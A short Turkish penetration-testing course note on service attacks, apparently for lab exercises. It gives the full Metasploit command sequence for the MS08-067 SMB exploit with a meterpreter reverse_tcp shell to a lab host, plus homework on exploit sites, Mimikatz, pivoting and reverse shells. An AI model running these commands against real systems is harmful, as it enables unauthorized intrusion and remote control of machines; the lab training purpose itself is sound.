# Servis Saldırıları

## Komutlar

```
msfconsole
db_rebuild_cache
search ms08
use exploit/windows/smb/ms08_067_netapi
show options
set rhost 10.0.3.6
set payload windows/meterpreter/reverse_tcp
set lhost 10.0.3.5
exploit
ls
pwd
getuid
screenshot
```

## Ödevler

- Exploit-db, 0day.today benzeri siteleri araştırınız ve düzenli olarak takip ediniz.
- Açıklıkların paylaşıldığı diğer plaformları araştırınız.
- Nessus veya openvas aracını çalıştırınız ve lab makineleri üzerinde test ediniz.
- Mimikatz aracını araştırınız.
- Metasploit komutlarını inceleyiniz. Pivot işleminin nasıl yapıldığını araştırınız.
- Metasploit aracı dışında exploit sitelerinden seçtiğiniz bir exploiti indirip çalıştırınız.
- Reverse ile bind shell almanın farklarını öğreniniz.
- Sunucudan shell almanın farklı yollarını araştırınız.
- Linux sunuculardan alınabilecek reverse shell yollarını araştırınız.
